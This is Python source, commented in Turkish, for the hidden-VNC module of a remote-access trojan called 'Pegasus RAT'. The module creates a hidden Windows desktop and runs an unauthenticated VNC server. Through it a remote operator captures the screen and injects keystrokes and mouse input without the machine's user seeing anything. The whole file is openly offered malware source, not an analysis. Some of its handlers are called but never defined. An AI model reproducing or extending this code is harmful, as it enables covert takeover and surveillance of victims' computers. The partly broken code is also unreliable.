#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus RAT HVNC (Hidden VNC) Modülü - Python adaptasyonu
Gizli masaüstü ve uzaktan kontrol özellikleri
"""

import os
import sys
import time
import threading
import platform
import subprocess
import socket
import struct
import json
import base64
from io import BytesIO
import tempfile

try:
    from PIL import Image, ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("PIL/Pillow not available - HVNC screenshot disabled")

try:
    import cv2
    import numpy as np
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False
    print("OpenCV not available - HVNC video disabled")

try:
    if platform.system() == "Windows":
        import win32gui
        import win32con
        import win32api
        import win32process
        import win32security
        WIN32_AVAILABLE = True
    else:
        WIN32_AVAILABLE = False
except ImportError:
    WIN32_AVAILABLE = False
    print("Win32 libraries not available - Windows HVNC features disabled")

class HiddenDesktop:
    """
    Gizli masaüstü yöneticisi (Windows)
    """
    
    def __init__(self):
        self.desktop_name = "PegasusHiddenDesktop"
        self.desktop_handle = None
        self.original_desktop = None
        self.created = False
        
    def create_hidden_desktop(self):
        """
        Gizli masaüstü oluşturur (Windows)
        """
        if not WIN32_AVAILABLE or platform.system() != "Windows":
            return False
        
        try:
            import win32service
            
            # Mevcut masaüstünü kaydet
            self.original_desktop = win32service.GetThreadDesktop(win32api.GetCurrentThreadId())
            
            # Yeni gizli masaüstü oluştur
            self.desktop_handle = win32service.CreateDesktop(
                self.desktop_name,
                None,
                None,
                0,
                win32con.DESKTOP_CREATEWINDOW | 
                win32con.DESKTOP_CREATEMENU |
                win32con.DESKTOP_HOOKCONTROL |
                win32con.DESKTOP_JOURNALRECORD |
                win32con.DESKTOP_JOURNALPLAYBACK |
                win32con.DESKTOP_ENUMERATE |
                win32con.DESKTOP_WRITEOBJECTS |
                win32con.DESKTOP_SWITCHDESKTOP,
                None
            )
            
            if self.desktop_handle:
                self.created = True
                return True
            
            return False
            
        except Exception as e:
            print(f"Gizli masaüstü oluşturma hatası: {e}")
            return False
    
    def switch_to_hidden_desktop(self):
        """
        Gizli masaüstüne geçiş yapar
        """
        if not self.created or not WIN32_AVAILABLE:
            return False
        
        try:
            import win32service
            
            # Thread'i gizli masaüstüne ata
            win32service.SetThreadDesktop(self.desktop_handle)
            
            # Masaüstünü aktif yap
            win32service.SwitchDesktop(self.desktop_handle)
            
            return True
            
        except Exception as e:
            print(f"Gizli masaüstü geçiş hatası: {e}")
            return False
    
    def switch_to_original_desktop(self):
        """
        Orijinal masaüstüne geri döner
        """
        if not self.original_desktop or not WIN32_AVAILABLE:
            return False
        
        try:
            import win32service
            
            # Orijinal masaüstüne geri dön
            win32service.SetThreadDesktop(self.original_desktop)
            win32service.SwitchDesktop(self.original_desktop)
            
            return True
            
        except Exception as e:
            print(f"Orijinal masaüstü geçiş hatası: {e}")
            return False
    
    def cleanup(self):
        """
        Gizli masaüstünü temizler
        """
        try:
            if self.created and WIN32_AVAILABLE:
                import win32service
                
                # Orijinal masaüstüne dön
                self.switch_to_original_desktop()
                
                # Gizli masaüstünü kapat
                if self.desktop_handle:
                    win32service.CloseDesktop(self.desktop_handle)
                
                self.created = False
                self.desktop_handle = None
                
        except Exception as e:
            print(f"Gizli masaüstü temizleme hatası: {e}")

class VNCServer:
    """
    VNC sunucu implementasyonu
    """
    
    def __init__(self, host="127.0.0.1", port=5900):
        self.host = host
        self.port = port
        self.socket = None
        self.client_socket = None
        self.running = False
        self.thread = None
        self.hidden_desktop = None
        
    def start_server(self):
        """
        VNC sunucusunu başlatır
        """
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            
            self.running = True
            self.thread = threading.Thread(target=self._server_loop, daemon=True)
            self.thread.start()
            
            print(f"VNC sunucu başlatıldı: {self.host}:{self.port}")
            return True
            
        except Exception as e:
            print(f"VNC sunucu başlatma hatası: {e}")
            return False
    
    def _server_loop(self):
        """
        VNC sunucu ana döngüsü
        """
        while self.running:
            try:
                print("VNC istemci bekleniyor...")
                client_socket, addr = self.socket.accept()
                print(f"VNC istemci bağlandı: {addr}")
                
                self.client_socket = client_socket
                self._handle_client()
                
            except Exception as e:
                if self.running:
                    print(f"VNC sunucu döngü hatası: {e}")
                time.sleep(1)
    
    def _handle_client(self):
        """
        VNC istemcisini işler
        """
        try:
            # VNC handshake
            if not self._vnc_handshake():
                return
            
            # Ana VNC döngüsü
            while self.running and self.client_socket:
                try:
                    # İstemciden mesaj al
                    data = self.client_socket.recv(1024)
                    if not data:
                        break
                    
                    # Mesajı işle
                    self._process_vnc_message(data)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"VNC istemci işleme hatası: {e}")
                    break
            
        except Exception as e:
            print(f"VNC istemci yönetim hatası: {e}")
        finally:
            if self.client_socket:
                self.client_socket.close()
                self.client_socket = None
    
    def _vnc_handshake(self):
        """
        VNC protokol handshake'i
        """
        try:
            # VNC protokol versiyonu gönder
            version = b"RFB 003.008\n"
            self.client_socket.send(version)
            
            # İstemci versiyonunu al
            client_version = self.client_socket.recv(12)
            print(f"VNC istemci versiyonu: {client_version}")
            
            # Güvenlik türleri gönder (No Authentication)
            security_types = b"\x01\x01"  # 1 tür, No Auth
            self.client_socket.send(security_types)
            
            # İstemci güvenlik seçimi
            security_choice = self.client_socket.recv(1)
            
            # Güvenlik sonucu gönder (OK)
            security_result = b"\x00\x00\x00\x00"
            self.client_socket.send(security_result)
            
            # İstemci init mesajı al
            client_init = self.client_socket.recv(1)
            
            # Sunucu init mesajı gönder
            self._send_server_init()
            
            return True
            
        except Exception as e:
            print(f"VNC handshake hatası: {e}")
            return False
    
    def _send_server_init(self):
        """
        VNC sunucu başlangıç bilgilerini gönderir
        """
        try:
            # Ekran boyutları
            width = 1920
            height = 1080
            
            # Pixel format
            bits_per_pixel = 32
            depth = 24
            big_endian = 0
            true_color = 1
            red_max = 255
            green_max = 255
            blue_max = 255
            red_shift = 16
            green_shift = 8
            blue_shift = 0
            
            # Desktop name
            name = b"Pegasus HVNC"
            name_length = len(name)
            
            # Server init mesajı oluştur
            server_init = struct.pack(
                ">HHBBBBHHHBBB3x",
                width, height,
                bits_per_pixel, depth, big_endian, true_color,
                red_max, green_max, blue_max,
                red_shift, green_shift, blue_shift
            )
            
            server_init += struct.pack(">I", name_length)
            server_init += name
            
            self.client_socket.send(server_init)
            
        except Exception as e:
            print(f"VNC server init hatası: {e}")
    
    def _process_vnc_message(self, data):
        """
        VNC mesajlarını işler
        """
        try:
            if len(data) == 0:
                return
            
            message_type = data[0]
            
            if message_type == 0:  # SetPixelFormat
                self._handle_set_pixel_format(data)
            elif message_type == 2:  # SetEncodings
                self._handle_set_encodings(data)
            elif message_type == 3:  # FramebufferUpdateRequest
                self._handle_framebuffer_update_request(data)
            elif message_type == 4:  # KeyEvent
                self._handle_key_event(data)
            elif message_type == 5:  # PointerEvent
                self._handle_pointer_event(data)
            elif message_type == 6:  # ClientCutText
                self._handle_client_cut_text(data)
            
        except Exception as e:
            print(f"VNC mesaj işleme hatası: {e}")
    
    def _handle_framebuffer_update_request(self, data):
        """
        Ekran güncellemesi isteğini işler
        """
        try:
            if len(data) < 10:
                return
            
            # Ekran görüntüsü al
            screenshot = self._capture_screenshot()
            if screenshot:
                self._send_framebuffer_update(screenshot)
                
        except Exception as e:
            print(f"Framebuffer update hatası: {e}")
    
    def _capture_screenshot(self):
        """
        Ekran görüntüsü alır
        """
        try:
            if not PIL_AVAILABLE:
                return None
            
            # Gizli masaüstünden ekran görüntüsü al
            if self.hidden_desktop and self.hidden_desktop.created:
                # Gizli masaüstüne geç
                self.hidden_desktop.switch_to_hidden_desktop()
            
            # Ekran görüntüsü al
            screenshot = ImageGrab.grab()
            
            # Orijinal masaüstüne geri dön
            if self.hidden_desktop and self.hidden_desktop.created:
                self.hidden_desktop.switch_to_original_desktop()
            
            return screenshot
            
        except Exception as e:
            print(f"Ekran görüntüsü alma hatası: {e}")
            return None
    
    def _send_framebuffer_update(self, screenshot):
        """
        Ekran güncellemesini gönderir
        """
        try:
            if not screenshot:
                return
            
            # Görüntüyü RGB formatına çevir
            width, height = screenshot.size
            rgb_data = screenshot.convert('RGB').tobytes()
            
            # FramebufferUpdate header
            header = struct.pack(">BBHHHHHI", 
                0,  # Message type
                0,  # Padding
                1,  # Number of rectangles
                0,  # X position
                0,  # Y position
                width,  # Width
                height, # Height
                0   # Encoding (Raw)
            )
            
            # Veriyi gönder
            self.client_socket.send(header)
            self.client_socket.send(rgb_data)
            
        except Exception as e:
            print(f"Framebuffer gönderme hatası: {e}")
    
    def _handle_key_event(self, data):
        """
        Klavye olayını işler
        """
        try:
            if len(data) < 8:
                return
            
            down_flag = data[1]
            key_sym = struct.unpack(">I", data[4:8])[0]
            
            print(f"Klavye olayı: {key_sym}, Basılı: {down_flag}")
            
            # Klavye olayını simüle et
            self._simulate_key_event(key_sym, down_flag)
            
        except Exception as e:
            print(f"Klavye olayı hatası: {e}")
    
    def _handle_pointer_event(self, data):
        """
        Fare olayını işler
        """
        try:
            if len(data) < 6:
                return
            
            button_mask = data[1]
            x = struct.unpack(">H", data[2:4])[0]
            y = struct.unpack(">H", data[4:6])[0]
            
            print(f"Fare olayı: ({x}, {y}), Butonlar: {button_mask}")
            
            # Fare olayını simüle et
            self._simulate_mouse_event(x, y, button_mask)
            
        except Exception as e:
            print(f"Fare olayı hatası: {e}")
    
    def _simulate_key_event(self, key_sym, down_flag):
        """
        Klavye olayını simüle eder
        """
        try:
            if WIN32_AVAILABLE and platform.system() == "Windows":
                # Windows klavye simülasyonu
                import win32api
                import win32con
                
                # VK kod dönüşümü (basitleştirilmiş)
                vk_code = self._keysym_to_vk(key_sym)
                if vk_code:
                    if down_flag:
                        win32api.keybd_event(vk_code, 0, 0, 0)
                    else:
                        win32api.keybd_event(vk_code, 0, win32con.KEYEVENTF_KEYUP, 0)
            
        except Exception as e:
            print(f"Klavye simülasyon hatası: {e}")
    
    def _simulate_mouse_event(self, x, y, button_mask):
        """
        Fare olayını simüle eder
        """
        try:
            if WIN32_AVAILABLE and platform.system() == "Windows":
                import win32api
                import win32con
                
                # Fare pozisyonunu ayarla
                win32api.SetCursorPos((x, y))
                
                # Fare butonları
                if button_mask & 1:  # Sol buton
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x, y, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x, y, 0, 0)
                
                if button_mask & 2:  # Orta buton
                    win32api.mouse_event(win32con.MOUSEEVENTF_MIDDLEDOWN, x, y, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_MIDDLEUP, x, y, 0, 0)
                
                if button_mask & 4:  # Sağ buton
                    win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x, y, 0, 0)
            
        except Exception as e:
            print(f"Fare simülasyon hatası: {e}")
    
    def _keysym_to_vk(self, keysym):
        """
        VNC keysym'i Windows VK koduna çevirir
        """
        # Basitleştirilmiş dönüşüm tablosu
        keysym_map = {
            0xff08: 0x08,  # BackSpace
            0xff09: 0x09,  # Tab
            0xff0d: 0x0D,  # Return
            0xff1b: 0x1B,  # Escape
            0xff50: 0x24,  # Home
            0xff51: 0x25,  # Left
            0xff52: 0x26,  # Up
            0xff53: 0x27,  # Right
            0xff54: 0x28,  # Down
            0xff55: 0x21,  # Page_Up
            0xff56: 0x22,  # Page_Down
            0xff57: 0x23,  # End
            0xff63: 0x2D,  # Insert
            0xffff: 0x2E,  # Delete
        }
        
        # ASCII karakterler
        if 0x20 <= keysym <= 0x7E:
            return keysym
        
        return keysym_map.get(keysym, None)
    
    def stop_server(self):
        """
        VNC sunucusunu durdurur
        """
        try:
            self.running = False
            
            if self.client_socket:
                self.client_socket.close()
                self.client_socket = None
            
            if self.socket:
                self.socket.close()
                self.socket = None
            
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=5)
            
            print("VNC sunucu durduruldu")
            
        except Exception as e:
            print(f"VNC sunucu durdurma hatası: {e}")

class HVNCManager:
    """
    HVNC yöneticisi - tüm HVNC özelliklerini koordine eder
    """
    
    def __init__(self, config=None):
        self.config = config
        self.hidden_desktop = None
        self.vnc_server = None
        self.running = False
        
    def start_hvnc(self, host="127.0.0.1", port=5900):
        """
        HVNC sistemini başlatır
        """
        try:
            print("HVNC sistemi başlatılıyor...")
            
            # Gizli masaüstü oluştur (Windows)
            if platform.system() == "Windows" and WIN32_AVAILABLE:
                self.hidden_desktop = HiddenDesktop()
                if self.hidden_desktop.create_hidden_desktop():
                    print("Gizli masaüstü oluşturuldu")
                else:
                    print("Gizli masaüstü oluşturulamadı, normal masaüstü kullanılacak")
            
            # VNC sunucusunu başlat
            self.vnc_server = VNCServer(host, port)
            self.vnc_server.hidden_desktop = self.hidden_desktop
            
            if self.vnc_server.start_server():
                self.running = True
                print(f"HVNC başarıyla başlatıldı: {host}:{port}")
                return True
            else:
                print("VNC sunucu başlatılamadı")
                return False
                
        except Exception as e:
            print(f"HVNC başlatma hatası: {e}")
            return False
    
    def stop_hvnc(self):
        """
        HVNC sistemini durdurur
        """
        try:
            self.running = False
            
            # VNC sunucusunu durdur
            if self.vnc_server:
                self.vnc_server.stop_server()
                self.vnc_server = None
            
            # Gizli masaüstünü temizle
            if self.hidden_desktop:
                self.hidden_desktop.cleanup()
                self.hidden_desktop = None
            
            print("HVNC sistemi durduruldu")
            
        except Exception as e:
            print(f"HVNC durdurma hatası: {e}")
    
    def get_status(self):
        """
        HVNC durumunu döndürür
        """
        return {
            'running': self.running,
            'hidden_desktop_created': self.hidden_desktop and self.hidden_desktop.created,
            'vnc_server_running': self.vnc_server and self.vnc_server.running,
            'platform_supported': platform.system() == "Windows" and WIN32_AVAILABLE,
            'pil_available': PIL_AVAILABLE
        }

# Test fonksiyonu
if __name__ == "__main__":
    print("Pegasus HVNC Modülü Testi")
    
    # HVNC yöneticisi testi
    manager = HVNCManager()
    status = manager.get_status()
    print(f"HVNC Durumu: {status}")
    
    # Kısa test
    if status['platform_supported']:
        print("HVNC test başlatılıyor...")
        if manager.start_hvnc("127.0.0.1", 5901):
            print("HVNC test başarılı - 10 saniye beklenecek")
            time.sleep(10)
            manager.stop_hvnc()
        else:
            print("HVNC test başarısız")
    else:
        print("HVNC bu platformda desteklenmiyor")
